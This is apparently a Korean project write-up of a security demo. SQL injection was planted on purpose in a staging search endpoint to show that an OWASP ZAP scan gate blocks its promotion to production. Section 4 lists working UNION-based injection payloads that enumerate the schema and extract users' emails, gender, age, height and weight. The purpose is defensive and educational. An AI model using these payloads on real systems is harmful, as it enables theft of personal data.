# DAST SQL Injection 시연 — 실증 결과 (2026-08-02 ~ 08-03)

발표 시연용으로 SQL Injection 취약점을 의도적으로 넣어 **정적 검사(SonarQube)는 통과하지만
동적 검사(ZAP DAST)에서 차단**되는 흐름을 실증한 기록. 게이트가 실제로 작동하려면 넘어야 했던
함정 3층, 취약점을 넣을 서비스 재선정, SQL Injection 5단계 실증, 커밋/PR 이력, 발표 자막까지.

- 대상: `product-service` `/search` (최종). 초기엔 `main-service` `/search`였으나 이전(§3).
- 스캔 대상 노드: staging NodePort — main-service `192.168.0.71:31001`, product-service `:31004`, 프론트 `:30000`
- 목데이터: staging `public.users` 20명(@dast.local), `service.user_health_profiles`에 키/몸무게/성별/출생연도

---

## 1. 결론 요약

- **CI 차단 실증**: 취약 코드 → SonarQube 통과 → Trivy 통과 → staging 배포 → **ZAP active scan이
  SQL Injection[40018]을 FAIL로 탐지(exit 1) → prod 승격 차단(UNSTABLE)**.
- **개인정보 탈취 실증**: 프론트 검색창(`/b/search`)에 UNION 페이로드 → 상품 대신 **회원 20명의
  이메일·성별·나이·키·몸무게** 노출.
- **보완 실증**: ORM 파라미터 바인딩으로 되돌리면 ZAP 통과(exit 0) → prod 정상 승격.

---

## 2. 게이트가 실제로 작동하기까지 — 함정 3층 (이번 시연의 핵심 발견)

"ZAP를 CI에 넣었다 = 게이트가 작동한다"가 아니었다. 취약 코드를 넣었는데도 **처음엔 그대로
prod까지 승격**됐고, 원인을 3개 밝혀 고쳐야 비로소 차단됐다.

### 함정 ① openapi.json 404 → ZAP가 스캔 대상을 못 읽음
- 증상: 취약 코드가 prod까지 승격됨. ZAP active scan은 `exit=0 PASS`.
- 원인: `zap-api-scan.py -t .../openapi.json`인데 **staging에서 openapi가 404**.
  `enable_api_docs` 기본 False(`backend/*/app/core/config.py`), staging values에 미설정.
  → ZAP가 import할 엔드포인트 목록이 비어 **0개 검사하고 통과**(로그: `Job spider error ...
  openapi ... 404`).
- 수정: `zero-manifests` `charts/<svc>/values-staging.yaml`의 `env`에 `ENABLE_API_DOCS: "true"`
  추가(staging만, prod values엔 없음 → prod는 openapi 비노출 유지). **configmap 변경이라 파드
  rollout restart 필요**(자동 반영 안 됨).

### 함정 ② zap-api-scan은 기본적으로 모든 알림을 WARN 처리
- 증상: openapi 노출 후 ZAP가 `WARN-NEW: SQL Injection [40018]`으로 **탐지는 했으나** `FAIL-NEW: 0`
  이라 통과(`exit=0`).
- 원인: 공식 문서 — "By default, all alerts found by ZAP will be treated as WARNings." +
  Jenkinsfile의 `-I`(WARN 무시)라 High 취약점도 통과.
- 수정: `-c zap-api-scan.conf`로 **주입 계열만 FAIL로 승격**(아래 §5). 나머지(보안 헤더 등)는 기본
  WARN 유지 → 오탐으로 무관 서비스 배포가 막히지 않음.

### 함정 ③ (부수) 500 에러는 차단 사유가 아님
- 홑따옴표로 500이 나도 Jenkins는 ZAP exit code만 본다. 500 자체로는 안 막힌다. ②의 config로
  40018을 FAIL로 만들어야 exit 1 → 차단.

> 발표 포인트: "게이트가 있다 ≠ 작동한다. openapi 미노출로 검사조차 못 하고, 탐지해도 기본 WARN이라
> 통과하던 걸 고쳐야 실제로 막혔다."

---

## 3. 취약점을 넣을 서비스 재선정 (main-service → product-service)

- 처음엔 `main-service` `/search`(빈 껍데기)에 취약점을 넣어 **CI 차단은 성공**했다.
- 그러나 **프론트 검색창은 main-service를 호출하지 않았다.** Istio 라우팅
  (`zero-manifests/istio/production-edge/routing.yaml`)이 `/b/search` → **product-service**로 보낸다.
  응답 헤더 `x-envoy-decorator-operation: product-service...`로 확인.
- 즉 "검색창에서 개인정보가 뜨는" 수동 시연을 하려면 **product-service**에 취약점이 있어야 했다.
  → product-service로 이전.
- product-service `/search`는 이미 ORM(`_apply_search_filters`의 or_/ilike)로 구현돼 있어, 취약
  버전으로 교체.

### product-service 취약 코드 방식 (WHERE절 주입은 한계 → from_statement)
- 1차 시도(`WHERE product_name ILIKE '%'+query+'%'`)는 ZAP 차단은 됐으나, **UNION이 WHERE 절
  안이라 데이터 추출이 안 됨**(products 테이블이 비어 결과 0). 검색창 실증 불가.
- 2차(채택): `search_products`에서 검색어가 있을 때 **SQL 전체를 raw로 조립해
  `select(Product).from_statement(text(sql))`**. UNION을 SQL 끝에 붙일 수 있어 products가 비어도
  users를 추출. 결과가 Product 객체로 매핑돼 라우터 변경 불필요.

---

## 4. SQL Injection 5단계 실증 (product-service, 검증 완료)

취약 코드 배포 상태에서 `/search`에 순서대로. 프론트 경유(`:30000/b/search`) 동일 동작 확인.

| 단계 | 페이로드(검색창 query) | 결과 |
|---|---|---|
| ① 탐지 | `'` | HTTP 500 (SQL 깨짐 = 취약 확인) |
| ② 컬럼 개수 | `' ORDER BY 18 --` | 500 (17까지 200) → 컬럼 17개 |
| ③ 주입 위치 | `' UNION SELECT gen_random_uuid(),NULL,'INJ_NAME','INJ_DESC',NULL,NULL,NULL,NULL,0,NULL,0,NULL,NULL,NULL,NULL,'',NULL --` | 카드 name=INJ_NAME, desc=INJ_DESC → 3·4번이 노출 자리 |
| ④ DB 구조 | `' UNION SELECT gen_random_uuid(),NULL,table_name,column_name,NULL,NULL,NULL,NULL,0,NULL,0,NULL,NULL,NULL,NULL,'',NULL FROM information_schema.columns WHERE table_name='users' --` | users 컬럼 11개 발견(email,tall,weight,birthday...) |
| ⑤ 데이터 추출 | `' UNION SELECT gen_random_uuid(),NULL,u.email,(h.gender\|\|' / '\|\|(2026-h.birth_year)::text\|\|'yo / '\|\|h.height_cm::text\|\|'cm / '\|\|h.weight_kg::text\|\|'kg'),NULL,NULL,NULL,NULL,0,NULL,0,NULL,NULL,NULL,NULL,'',NULL FROM public.users u JOIN service.user_health_profiles h ON h.user_id=u.id --` | 회원 20명 이메일·성별·나이·키·몸무게 |

- ⑤ 결과 예: `user4@dast.local | M / 49yo / 180.00cm / 89.00kg`
- Product 모델 17컬럼 순서: product_id, report_no, product_name, brand_name, manufacturer_name,
  food_type, serving_value, serving_unit, calories, carbohydrate, sugars, protein, fat, sodium,
  ingredient_text, image_url, purchase_url. (NOT NULL: product_id/product_name/calories/sugars/image_url)
- 타입 주의: UNION 1번 자리는 UUID(`gen_random_uuid()`), 9·11번(calories/sugars)은 0, 나머지 텍스트/NULL.
  NULL만 17개 넣으면 from_statement의 Product 매핑에서 타입 불일치로 500.

### CI 차단 로그의 핵심 3줄 (발표에서 짚을 곳)
```
FAIL-NEW: SQL Injection [40018] x 1
    http://192.168.0.71:31004/search?query=%27... (500 Internal Server Error)
active scan FAIL(High) — product-service prod 승격 차단  → exit 1 → UNSTABLE
```

---

## 5. 게이트 수정 산출물 (재현용)

### zap-api-scan.conf (zero repo 루트) — 주입 계열만 FAIL
형식 `<rule_id>\t<FAIL|WARN|IGNORE>\t(설명)`. 채택 규칙:
`40018~40022`(SQLi 계열), `40012/40014/40016/40017`(XSS), `90019`(Server Side Code Injection),
`90020`(OS Command), `90021`(XPath), `90035/90036`(SSTI), `40015`(LDAP) → 전부 **FAIL**.

### Jenkinsfile active scan 블록
`zap-api-scan.py ... -f openapi -I -c zap-api-scan.conf ...` (conf를 컨테이너 `/zap/wrk`로 cp 후 `-c`
전달). 차단 조건은 기존 `if [ "$API_RC" = "1" ]` 유지 — 이제 주입 계열이 FAIL이라 exit 1이 남.

### zero-manifests: staging openapi 노출
`charts/main-service/values-staging.yaml`, `charts/product-service/values-staging.yaml`의 `env`에
`ENABLE_API_DOCS: "true"`. prod values엔 없음.

---

## 6. 보완 코드 (ORM 파라미터 바인딩)

- main-service: `select(...).where(Product.product_name.ilike(f"%{keyword}%"))` — ilike 값은
  SQLAlchemy가 파라미터로 바인딩 → 주입 불가.
- product-service: 원본 `_apply_search_filters`의 `or_(name.ilike, brand.ilike)` 복원.
- 보완 후 ZAP active scan `exit=0` 통과 → prod 정상 승격 확인.

---

## 7. 커밋 / PR 이력

| PR | 내용 |
|---|---|
| #279 | main-service /search 취약(직접조립) — CI 흐름 최초 실증 |
| #280 | main-service ORM 복원 |
| #282 | **ZAP 주입계열 FAIL config** (`b6191f2`) — 게이트 함정② 수정 |
| #283/#284 | product-service 취약(WHERE절 → from_statement) |
| #285 | main+product ORM 복원 |
| #287 | product ORM 복원 |
| #289/#291 | 시연 녹화용 취약 재투입 (`yoonK/back/product`) |
| #290/#292 | 시연 녹화용 보안 복원 (`yoonK/back/product`) |
| zero-manifests #7/#10 | staging openapi 노출(main/product) — 게이트 함정① 수정 |

- 취약 원본 커밋(복원용): main-service `423c5d1`, product-service `c348e3d`(from_statement).
- 보안 원본 커밋: main-service `b00bd5c`, product-service `be07162`.
- 시연 브랜치 규칙: `yoonK/back/product`, 커밋 메시지 `fix: 시연용 sql injection 취약점 코드 삽입/삭제`.
  (같은 브랜치명 재사용 시 로컬 삭제 후 origin/main에서 재생성.)

---

## 8. 발표 자막 (최종)

1. product-service에 SQL Injection 취약점이 있는 코드를 작성해 push합니다.
2. 생성된 branch를 main에 통합시킵니다.
3. git push(main 통합)를 감지해 Jenkins CI 파이프라인이 실행됩니다.
4. 파이프라인 로그를 확인합니다.
5. 정적 코드 분석(SonarQube)과 이미지 스캔(Trivy)을 수행합니다. 통과 시 Harbor에 이미지를 push하고,
   매니페스트 태그를 갱신하면 ArgoCD가 스테이징 환경에 배포합니다.
6. 실행 중인 애플리케이션을 대상으로 동적 분석(DAST, OWASP ZAP)을 수행합니다.
7. SQL Injection 취약점을 발견하여 운영(prod) 배포가 차단됩니다.
8. 슬랙으로 product-service 배포 실패(UNSTABLE) 알림을 받습니다.
9. ArgoCD에서 확인하면, product-service가 스테이징에는 배포됐지만 운영에는 승격되지 않은 것을 볼 수 있습니다.
10. 테스트 환경 서비스들은 NodePort로 노출돼 있습니다.
11. 그 포트로 스테이징에 접속해 SQL Injection이 가능한지 확인합니다.
12. 검색창에 UNION 쿼리를 입력해, 상품 대신 회원의 이메일·성별·나이·키·몸무게 같은 개인정보가
    조회되는 것을 확인합니다.
12-1. 취약점을 확인했으니 검색 로직을 안전한 코드(ORM 파라미터 바인딩)로 수정해 다시 push합니다.
12-2. 이번엔 동적 분석을 통과하여 운영 환경까지 정상 배포됩니다.
13. 실제 사이트에서 동일하게 시도하면 공격이 통하지 않습니다.
    → 이를 통해 CI/CD 파이프라인에 동적 보안 검사(DAST)를 게이트로 통합하여, 취약한 코드가 운영
       환경에 배포되기 전에 자동으로 차단하고 서비스의 보안성을 높일 수 있었습니다.

---

## 9. 안전 원칙 / 주의

- 취약 코드는 staging(가짜 목데이터 @dast.local)에서만 시연. ZAP가 prod 승격을 막아 운영 미도달.
- 시연 종료 후 반드시 ORM으로 원복(§6). 현재 main/prod = 보안 코드.
- 관련 메모리: [[backend-dast]](게이트 함정 3층 추가 반영 필요), [[frontend-dast]].
